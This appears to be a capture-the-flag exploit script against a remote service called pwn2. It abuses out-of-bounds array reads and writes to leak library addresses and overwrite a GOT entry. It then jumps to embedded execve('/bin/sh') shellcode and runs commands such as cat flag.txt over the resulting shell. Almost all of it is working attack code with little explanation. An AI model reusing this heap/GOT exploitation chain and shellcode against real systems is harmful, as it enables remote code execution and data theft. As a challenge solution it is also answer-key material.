#!/usr/bin/env python3

import socket
import sys
import random
import binascii
import time
import struct

BUFSIZE = 2048

def readuntil(s,val):
	buf = b''
	while not buf.endswith(val):
		ret = s.recv(BUFSIZE)
		buf = buf + ret
		#print(buf)
		#print(buf.decode('ascii'))
		if len(ret) == 0:
			raise Exception('received zero bytes')
	return buf

def recvall(s,count):
	buf = b''
	while len(buf) != count:
		ret = s.recv(count-len(buf))
		buf = buf + ret
		#print('<<', buf)
		#print(buf.decode('ascii'))
		if len(ret) == 0:
			raise Exception('received zero bytes')
	#hexdump(buf)
	return buf

def sendall(s,buf):
	#print('>>', buf)
	s.send(buf)

def hexdump(data):
	import subprocess
	ret = subprocess.Popen(['xxd','-'],stdin=subprocess.PIPE,stdout=subprocess.PIPE).communicate(data)[0]
	print(ret.decode('ascii'))

def testing():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	#s.connect(('3.93.128.89',1208))
	s.connect(('localhost',1208))

	sendall(s,bytes([1,32]))
	#sendall(s,bytes([3,0,2,4])+b'ABCD')
	#sendall(s,bytes([2,0,0,100]))
	#recvall(s,100)
	sendall(s,bytes([1,31]))
	#sendall(s,bytes([2,0,0,255]))
	#recvall(s,255)
	#sendall(s,bytes([2,1,0,255]))
	#recvall(s,255)
	sendall(s,bytes([1,30]))
	sendall(s,bytes([1,29]))
	sendall(s,bytes([1,28]))
	#sendall(s,bytes([3,2,2,4])+b'IJKL')
	sendall(s,bytes([2,0,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,1,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,2,0,255]))
	recvall(s,255)

	sendall(s,bytes([3,1,2,4])+b'EFGH')
	sendall(s,bytes([3,1,6,4])+b'IJKL')
	
	sendall(s,bytes([2,0,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,1,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,2,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,3,0,255]))
	recvall(s,255)
	sendall(s,bytes([2,4,0,255]))
	recvall(s,255)

	time.sleep(100)

def func_Add(s, length):
	assert length < 256
	print('Add(0x%x)'%length)
	sendall(s, bytes([1,length]))

def func_Write(s, index, offset, size):
	assert offset < 256
	assert size < 256
	print('Write(%d,0x%x) <<' % (index, offset))
	sendall(s, bytes([2,index,offset,size]))
	ret = recvall(s,size)
	hexdump(ret)
	return ret

def func_Read(s, index, offset, data):
	assert offset < 256
	assert len(data) < 256
	print('Read(%d,0x%x) >>'%(index, offset), binascii.hexlify(data))
	sendall(s, bytes([3,index,offset,len(data)]) + data)

if __name__ == '__main__':

	SHELLCODE = binascii.unhexlify('31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	s.connect(('3.93.128.89',1208))
	#s.connect(('localhost',1208))

	#sendall(s, b'\x01\x20\x01\x1f\x01\x1e\x01\x1d\x01\x1c\x01\x1b\x00') # 00 won't do anything
	func_Add(s, 0x20)
	func_Add(s, 0x1f)
	func_Add(s, 0x1e)
	#func_Add(s, 0x1d)
	#func_Add(s, 0x1c)
	#func_Add(s, 0x1b)

	#func_Write(s, 0, 0, 0xf0)
	func_Write(s, 1, 0, 0xf0)
	#func_Write(s, 2, 0, 0xf0)
	#func_Write(s, 3, 0, 0xf0)
	#func_Write(s, 4, 0, 0xf0)
	#func_Write(s, 5, 0, 0xf0)

	#func_Write(s, 1, 0, 0xf0)
	#func_Read(s, 1, 0x70, struct.pack('Q',0x400018))
	print('Overwrite the MT in FastByteArray[2]')
	#func_Read(s, 1, 0x70, struct.pack('Q',0x400000)) # fail
	#func_Read(s, 1, 0x70, struct.pack('Q',0x400018)) # works, but for testing
	print('... with pwn2 GOT')
	func_Read(s, 1, 0x70, struct.pack('Q',0x614000))
	ret = func_Write(s, 2, 0, 0xf0)

	# overwrite the GOT to see if we get a crash ... we don't
	#func_Read(s, 2, 0, bytes(0xff))
	#func_Read(s, 2, 0xff, bytes(0xff))
	#func_Write(s, 2, 0, 0xff)

	# get the base of libstdc++.so
	stdcpp_address, = struct.unpack('Q',ret[8:16]) # _ZNSs6appendEPKcm@GLIBCXX_3.4 + 0
	# readelf -a /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
	# 00000017f968  0b2c00000007 R_X86_64_JUMP_SLO 00000000000d1dc0 _ZNSs6appendEPKcm@@GLIBCXX_3.4 + 0
	print('address: %x'%stdcpp_address)
	stdcpp_base = stdcpp_address - 0x00000000000d1dc0

	# get the base of a RWX page
	rwx_base = stdcpp_base + 0x7f9b773a3000 - 0x7f9b77dfd000
	print('Overwrite the MT in FastByteArray[2]')
	print('... with a RWX page')
	func_Read(s, 1, 0x70, struct.pack('Q',rwx_base))
	ret = func_Write(s, 2, 0, 0xf0)
	func_Read(s, 2, 0, SHELLCODE)

	system_native_base = stdcpp_base + 0x7f9b73c6d000 - 0x7f9b77dfd000
	system_native_got = system_native_base + 0x000000000020f000

	print('Overwrite the MT in FastByteArray[2]')
	print('... with System.Native GOT')
	func_Read(s, 1, 0x70, struct.pack('Q',system_native_got))
	ret = func_Write(s, 2, 0, 0xf0)

	# readelf -a /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
	# 00000020f0b0  002e00000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
	# 00000020f1e8  007e00000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
	write_addr, = struct.unpack('Q',ret[0xa0:0xa8])
	print('write address:', hex(write_addr))
	ret = func_Write(s, 2, 0xf0, 0xf0)
	read_addr, = struct.unpack('Q',ret[0xe8:0xf0])
	print('read address:', hex(read_addr))

	func_Read(s, 2, 0xa0, struct.pack('Q',rwx_base+0x10))
	#func_Read(s, 2, 0xa0, struct.pack('Q',rwx_base+0x10))
	#func_Write(s, 2, 0, 0xf0)
	# trigger a write to hit our GOT overwrite
	sendall(s, bytes([2,0,0,1]))
	
	sendall(s,b'id\n')
	print(readuntil(s,b'\n').decode('ascii'))
	sendall(s,b'ls -l\n')
	print(readuntil(s,b'\n').decode('ascii'))
	sendall(s,b'cat flag.txt\n')
	print(readuntil(s,b'}').decode('ascii'))
	sendall(s,b'cat pwn2.runtimeconfig.dev.json\n')
	print(readuntil(s,b'}').decode('ascii'))
	sendall(s,b'cat pwn2.runtimeconfig.json\n')
	print(readuntil(s,b'}').decode('ascii'))
